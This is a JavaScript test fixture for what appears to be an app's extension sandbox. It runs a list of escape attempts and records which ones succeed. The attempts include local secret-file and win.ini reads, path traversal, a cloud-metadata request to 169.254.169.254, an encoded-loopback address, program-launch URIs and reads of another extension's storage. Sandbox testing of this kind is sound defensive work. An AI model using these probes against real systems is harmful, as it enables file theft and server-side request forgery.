// M0 fixture: a hostile extension. Every entry in Attacks tries to break out of the sandbox; the
// experiment records what actually happened. __CANARY__ is a loopback HTTP server that counts hits,
// __SECRET_FILE__ a temp file holding a secret this script is never told.
var CANARY = "__CANARY__";
var SECRET_FILE = "__SECRET_FILE__";

function syncXhr(url, method) {
  var x = new XMLHttpRequest();
  x.open(method || "GET", url, false);
  x.send();
  var text = x.responseText || "";
  return mark(x.status, text);
}
// Markers are assembled at run time so they never appear verbatim in this script's own source
// (which the host legitimately serves back to this extension).
var SECRET_MARK = ["RIUPLAY", "M0", "SECRET"].join("-");
var OTHER_MARK = ["B", "SECRET", "IDB"].join("-");
var WININI_MARK = ["[fo", "nts]"].join("");
function mark(status, text) {
  return { status: status, length: text.length, leaked: text.indexOf(SECRET_MARK) >= 0, hasOtherExtensionCode: text.indexOf(OTHER_MARK) >= 0, hasWinIni: text.indexOf(WININI_MARK) >= 0 };
}
function nativeFetch(url, init) {
  // The host shadows `fetch`; a hostile script can still reach the native one.
  return WorkerGlobalScope.prototype.fetch.call(self, url, init);
}

var Provider = { getSettings: function () { return {}; } };

var Attacks = {
  nodeAndElectronGlobals: function () {
    return {
      require: typeof require, process: typeof process, module: typeof module, global: typeof global, __dirname: typeof __dirname,
      electron: typeof electron, ipcRenderer: typeof ipcRenderer, Buffer_isPolyfill: typeof Buffer !== "undefined" && !Buffer.from.toString().includes("native"),
    };
  },
  functionConstructorEscape: function () {
    var viaFunction = (function () {}).constructor("return typeof process + '/' + typeof require")();
    var viaThis = (function () {}).constructor("return this")();
    return { viaFunction: viaFunction, globalHasProcess: !!(viaThis && viaThis.process), globalIsWorker: viaThis === self };
  },
  evalAllowed: function () {
    try { return { eval: eval("1 + 1") }; } catch (e) { return { blocked: e.name }; }
  },
  readFileSyncXhr: function () { return syncXhr("file:///" + SECRET_FILE.replace(/\\/g, "/")); },
  readFileFetch: async function () { var r = await nativeFetch("file:///" + SECRET_FILE.replace(/\\/g, "/")); return mark(r.status, await r.text()); },
  readFileImportScripts: function () { importScripts("file:///" + SECRET_FILE.replace(/\\/g, "/")); return "imported"; },
  readWindowsFile: async function () { var r = await nativeFetch("file:///C:/Windows/win.ini"); return { status: r.status, bytes: (await r.text()).length }; },
  hostPathTraversal: function () {
    return {
      dotdot: syncXhr("riuplay-ext-host://host/../../../../Windows/win.ini"),
      encoded: syncXhr("riuplay-ext-host://host/%2e%2e/%2e%2e/Windows/win.ini"),
      otherExtension: syncXhr("riuplay-ext-host://host/ext.js?id=malicious-b"),
      otherExtensionPath: syncXhr("riuplay-ext-host://host/ext/malicious-b.js"),
      unknownBrokerRoute: syncXhr("riuplay-ext-host://host/broker/readFile?path=C:/Windows/win.ini", "POST"),
    };
  },
  directFetchLoopback: async function () { var r = await nativeFetch(CANARY + "/direct-fetch"); return { status: r.status }; },
  directXhrLoopback: function () { return syncXhr(CANARY + "/direct-xhr"); },
  directFetchPublicInternet: async function () { var r = await nativeFetch("https://example.com/"); return { status: r.status }; },
  directFetchNoCors: async function () { var r = await nativeFetch(CANARY + "/no-cors", { mode: "no-cors" }); return { type: r.type }; },
  webSocketLoopback: function () {
    return new Promise(function (resolve) {
      try {
        var ws = new WebSocket(CANARY.replace("http", "ws") + "/ws");
        ws.onopen = function () { resolve("opened"); };
        ws.onerror = function () { resolve("error"); };
        setTimeout(function () { resolve("no-connection"); }, 2000);
      } catch (e) { resolve("threw " + e.name); }
    });
  },
  importScriptsRemote: function () { importScripts(CANARY + "/import.js"); return "imported"; },
  nestedWorkerEscape: function () { var w = new Worker(CANARY + "/w.js"); return typeof w; },
  launchProgramFetch: async function () { var r = await nativeFetch("ms-calculator:"); return { status: r.status }; },
  launchProgramXhr: function () { return syncXhr("calculator://"); },
  launchProgramWorker: function () { var w = new Worker("ms-calculator:"); return typeof w; },
  launchProgramImport: function () { importScripts("ms-settings:"); return "imported"; },
  brokerLoopback: function () { return fetch(CANARY + "/via-broker"); },
  brokerMetadata: function () { return fetch("http://169.254.169.254/latest/meta-data/"); },
  brokerEncodedLoopback: function () { return fetch("http://2130706433:80/"); },
  brokerUndeclaredHost: function () { return fetch("https://example.com/"); },
  brokerFileUrl: function () { return fetch("file:///C:/Windows/win.ini"); },
  brokerStorageOfOther: function () {
    // Broker storage is keyed by the session the request arrived on, not by anything the script says.
    var x = new XMLHttpRequest();
    x.open("POST", "riuplay-ext-host://host/broker/storage", false);
    x.setRequestHeader("content-type", "application/json");
    x.send(JSON.stringify({ op: "get", key: "secret", id: "malicious-b", extension: "malicious-b" }));
    return x.responseText;
  },
  indexedDbOfOther: function () {
    return new Promise(function (resolve) {
      var open = indexedDB.open("shared-db", 1);
      open.onupgradeneeded = function () { open.result.createObjectStore("kv"); };
      open.onsuccess = function () {
        var get = open.result.transaction("kv").objectStore("kv").get("secret");
        get.onsuccess = function () { resolve({ value: get.result === undefined ? null : get.result }); };
        get.onerror = function () { resolve("error"); };
      };
      open.onerror = function () { resolve("open-error"); };
    });
  },
  cacheStorageOfOther: async function () {
    try {
      var keys = await caches.keys();
      return { cacheNames: keys };
    } catch (e) { return { threw: e.name }; }
  },
  crossOriginIsolated: function () { return { crossOriginIsolated: self.crossOriginIsolated === true, sharedArrayBuffer: typeof SharedArrayBuffer }; },
};
